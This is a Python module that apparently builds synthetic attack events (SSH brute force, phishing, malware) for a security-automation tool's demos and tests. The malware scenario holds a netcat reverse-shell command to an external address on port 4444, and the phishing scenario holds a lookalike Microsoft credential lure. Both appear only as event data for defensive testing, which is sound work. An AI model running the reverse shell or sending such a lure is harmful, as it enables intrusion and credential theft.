"""Safe, local attack simulations: synthetic events only, nothing touches the network.

Each scenario returns a list of (source, payload) pairs that mimic what a real sensor would send.
They are used by the CLI (`python -m soar.cli simulate <scenario>`) and by the end-to-end tests, so
the demo path and the tested path are the same code. IPs are real public addresses used purely as
labels inside events; no packet is ever sent to them.
"""
from __future__ import annotations

from datetime import datetime, timedelta, UTC

ATTACKER = "91.219.236.222"


def _ts(base: datetime, seconds: int) -> str:
    return (base + timedelta(seconds=seconds)).isoformat()


def brute_force(base: datetime | None = None, host: str = "kali-vm-01", attempts: int = 8) -> list[tuple[str, dict]]:
    """SSH brute force: repeated failures from one external IP, then Wazuh's composite rule fires."""
    base = base or datetime.now(UTC)
    out: list[tuple[str, dict]] = []
    for i in range(attempts):
        out.append(("syslog", {"timestamp": _ts(base, i * 4), "host": host,
                               "message": f"sshd[1201]: Failed password for {'root' if i % 2 else 'admin'} "
                                          f"from {ATTACKER} port {40000 + i} ssh2"}))
    out.append(("wazuh", {
        "timestamp": _ts(base, attempts * 4 + 2),
        "rule": {"id": "100001", "level": 10, "frequency": attempts, "groups": ["authentication_failures", "sshd"],
                 "description": "Multiple SSH authentication failures from the same source IP.",
                 "mitre": {"id": ["T1110"], "tactic": ["Credential Access"], "technique": ["Brute Force"]}},
        "agent": {"id": "001", "name": host, "ip": "192.168.64.9"}, "data": {"srcip": ATTACKER, "dstuser": "root"},
        "full_log": f"sshd: Failed password for root from {ATTACKER}"}))
    return out


def phishing(base: datetime | None = None) -> list[tuple[str, dict]]:
    base = base or datetime.now(UTC)
    raw = ("From: Microsoft 365 Support <no-reply@micros0ft-365-verify.top>\n"
           "To: finance@corp.test\nSubject: Your password expires today\n"
           "Reply-To: helpdesk@mail-relay.example.net\n"
           f"Date: {base.strftime('%a, %d %b %Y %H:%M:%S +0000')}\n"
           "Authentication-Results: mx.corp.test; spf=fail; dkim=none\n\n"
           "URGENT: your Microsoft 365 password expires in 2 hours. Keep your account active: "
           "http://micros0ft-365-verify.top/login?user=finance\nFailure to verify will lock your account.")
    return [("email", {"raw": raw})]


def malware(base: datetime | None = None, host: str = "web-server-01") -> list[tuple[str, dict]]:
    """Suspicious process (reverse-shell style command) followed by unusual outbound traffic."""
    base = base or datetime.now(UTC)
    c2 = "185.220.101.44"
    return [
        ("wazuh", {"timestamp": _ts(base, 0),
                   "rule": {"id": "100002", "level": 12, "groups": ["syscheck", "suspicious_activity"],
                            "description": "Suspicious network utility usage detected (Possible Reverse Shell).",
                            "mitre": {"id": ["T1059"], "tactic": ["Execution"],
                                      "technique": ["Command and Scripting Interpreter"]}},
                   "agent": {"id": "003", "name": host, "ip": "192.168.64.10"}, "data": {"dstuser": "www-data"},
                   "full_log": f"nc -e /bin/bash {c2} 4444"}),
        ("network", {"timestamp": _ts(base, 20), "src_ip": "192.168.64.10", "dst_ip": c2, "dst_port": 4444,
                     "src_host": host, "event_type": "network_connection", "severity": 3, "bytes_out": 4_800_000,
                     "title": "Outbound connection to rare external host"}),
    ]


SCENARIOS = {"brute_force": brute_force, "phishing": phishing, "malware": malware}
